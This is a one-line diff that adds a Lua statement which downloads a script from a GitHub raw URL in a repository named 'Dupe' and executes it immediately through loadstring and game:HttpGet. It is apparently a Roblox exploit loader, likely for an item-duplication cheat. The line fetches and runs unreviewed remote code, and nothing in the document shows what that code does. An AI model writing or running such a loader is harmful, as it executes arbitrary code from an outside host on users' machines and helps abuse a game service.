@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/2317851680/Dupe/main/Dupe"))()
